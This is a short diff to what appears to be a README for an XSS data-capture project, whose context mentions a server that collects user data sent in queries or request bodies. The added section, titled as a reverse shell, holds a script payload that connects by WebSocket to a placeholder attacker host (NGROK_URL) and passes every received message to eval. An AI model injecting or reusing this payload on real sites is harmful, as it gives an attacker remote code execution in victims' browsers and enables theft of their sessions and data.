@@ -23,6 +23,16 @@ http server capture user data by either sending the data in a query or in the bo
          ) 
   </script>
 ```
+
+#### reverse shell connection to the application ####
+> > whenever it recieve a message its going to execute it!
+```js
+  <script>
+     s = new WebSocket('wss://NGROK_URL')
+     s.onmessage = e => eval(e.data)
+  </script>
+```
+
 _____________________________
 
 ### Running the servers
